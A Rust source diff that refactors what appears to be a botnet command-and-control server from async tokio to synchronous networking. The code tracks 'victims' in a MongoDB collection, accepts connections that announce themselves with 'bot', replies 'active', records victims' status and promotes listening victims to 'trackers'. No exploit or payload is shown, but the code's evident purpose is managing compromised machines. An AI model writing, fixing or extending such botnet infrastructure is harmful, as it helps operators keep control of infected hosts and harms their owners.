@@ -1,9 +1,11 @@
 use std::{fmt::Display, net::SocketAddr};
+use std::io::{BufRead, BufReader, Write};
+use std::net::TcpStream;
 
-use serde::{Serialize, Deserialize};
-use tokio::{io::{BufReader, AsyncBufReadExt, AsyncWriteExt}, net::TcpStream};
-use mongodb::Collection;
 use mongodb::bson::doc;
+use mongodb::sync::Collection;
+
+use serde::{Deserialize, Serialize};
 
 use crate::tracker::is_victim_listening;
 
@@ -30,10 +32,10 @@ pub struct Victim {
 }
 
 impl Victim {
-    pub async fn update_status(&self, victims_collection: &Collection<VictimDb>, status: bool) -> Result<(), Box<dyn std::error::Error>> {
+    pub fn update_status(&self, victims_collection: &Collection<VictimDb>, status: bool) -> Result<(), Box<dyn std::error::Error>> {
         let filter = doc! { "ip": self.ip.to_string() };
-        let update = doc! { "active": status };
-        victims_collection.update_one(filter, update, None).await?;
+        let update = doc! { "$set": { "active": status }};
+        victims_collection.update_one(filter, update, None)?;
 
         Ok(())
     }
@@ -46,11 +48,11 @@ pub struct VictimDb {
     pub active: bool
 }
 
-pub async fn check_connection(mut stream: &mut TcpStream, current_ip: &SocketAddr) -> Option<Victim> {
+pub fn check_connection(mut stream: &mut TcpStream, current_ip: &SocketAddr) -> Option<Victim> {
     let mut buf_reader = BufReader::new(&mut stream);
     let mut http_request: Vec<u8> = Vec::new();
     buf_reader
-        .read_until(0, &mut http_request).await.unwrap();
+        .read_until(0, &mut http_request).unwrap();
 
     let http_request = std::str::from_utf8(&http_request).unwrap();
     debug!("Request bytes: {:?}", http_request.as_bytes());
@@ -58,7 +60,7 @@ pub async fn check_connection(mut stream: &mut TcpStream, current_ip: &SocketAdd
         error!("Someone connected without sending 'bot'");
         return None;
     };
-    if stream.write_all("active\0".as_bytes()).await.is_err() {
+    if stream.write_all("active\0".as_bytes()).is_err() {
         return None;
     }
     debug!("ip: {}", current_ip);
@@ -67,13 +69,15 @@ pub async fn check_connection(mut stream: &mut TcpStream, current_ip: &SocketAdd
     let mut buf_reader = BufReader::new(stream);
 
     let mut buffer = Vec::new();
-    buf_reader.read_until(0, &mut buffer).await.unwrap();
+    buf_reader.read_until(0, &mut buffer).unwrap();
     let buffer = std::str::from_utf8(&buffer).unwrap();
     if buffer != "ready\0" {
         error!("The client's server responded '{}' instead of 'ready'", buffer);
         return None;
     }
-    if is_victim_listening(&victim).await {
+
+    // The victim only listens if it wants to be a tracker
+    if is_victim_listening(&victim) {
         info!("The victim: {} is listening and will become a tracker", victim.ip);
         victim.victim_type = VictimType::Tracker;
     }
